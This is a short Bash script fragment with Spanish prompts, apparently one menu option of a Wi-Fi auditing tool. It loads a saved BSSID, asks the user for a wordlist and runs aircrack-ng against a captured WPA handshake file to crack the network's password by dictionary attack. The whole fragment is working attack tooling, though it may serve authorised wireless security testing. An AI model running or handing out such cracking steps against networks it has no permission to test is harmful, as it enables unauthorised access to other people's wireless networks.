echo -e "\e[1;31m$(cat adlog)\e[0m"
echo ""

cd Auditoria_$(date +%Y-%m-%d)

bssid=$(< bssid.txt)

echo ""
echo -e "\033[31m[!] Para hacer un ataque de diccionario primero tienes que haber capturado el handshake.\033[0m"

echo ""
read -p $'\e[33m[-] Escribe la ruta del diccionario a utilizar: \e[0m ' diccionario

sudo aircrack-ng -b $bssid -w $diccionario Auditoria-01.cap

echo ""
read -p $'\e[31m[-] Ataque finalizado, presione ENTER para volver al menu principal. \e[0m ' enter
clear
